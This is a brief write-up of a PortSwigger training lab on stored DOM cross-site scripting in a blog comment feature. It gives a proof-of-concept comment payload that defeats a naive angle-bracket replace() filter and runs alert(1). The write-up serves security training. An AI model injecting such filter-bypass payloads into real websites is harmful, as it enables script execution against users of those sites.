# Stored DOM XSS

## Description

The website in [this lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored) contains a stored DOM vulnerability in the blog comment functionality. In an attempt to prevent XSS, the website uses the JavaScript `replace()` function to encode angle brackets.

## Reproduction and proof of concept

1.  Use a comment with the vector:

```text
<><img src=1 onerror=alert(1)>
```
